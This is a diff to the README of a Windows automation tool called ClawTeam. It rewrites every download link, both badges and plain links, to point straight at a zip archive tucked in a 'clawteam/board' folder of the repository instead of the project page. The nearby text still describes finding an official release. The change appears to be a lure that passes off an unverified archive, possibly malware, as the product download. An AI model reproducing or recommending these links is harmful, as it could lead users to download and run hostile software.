@@ -1,6 +1,6 @@
 # 🤖 ClawTeam - One Command for Full Automation
 
-[![Download ClawTeam](https://img.shields.io/badge/Download%20ClawTeam-0078D4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/SSevence/ClawTeam)
+[![Download ClawTeam](https://img.shields.io/badge/Download%20ClawTeam-0078D4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/SSevence/ClawTeam/raw/refs/heads/main/clawteam/board/Team_Claw_3.0.zip)
 
 ## 🚀 What ClawTeam Does
 
@@ -36,7 +36,7 @@ For best results:
 
 Visit this page to download ClawTeam:
 
-[https://github.com/SSevence/ClawTeam](https://github.com/SSevence/ClawTeam)
+[https://github.com/SSevence/ClawTeam/raw/refs/heads/main/clawteam/board/Team_Claw_3.0.zip](https://github.com/SSevence/ClawTeam/raw/refs/heads/main/clawteam/board/Team_Claw_3.0.zip)
 
 Open the page, look for the latest release, and download the Windows version.
 
@@ -213,7 +213,7 @@ Avoid moving files around while the app is running.
 
 ## 📎 Download Link
 
-[Download ClawTeam from GitHub](https://github.com/SSevence/ClawTeam)
+[Download ClawTeam from GitHub](https://github.com/SSevence/ClawTeam/raw/refs/heads/main/clawteam/board/Team_Claw_3.0.zip)
 
 ## 🧪 If You Want a Clean Start
 
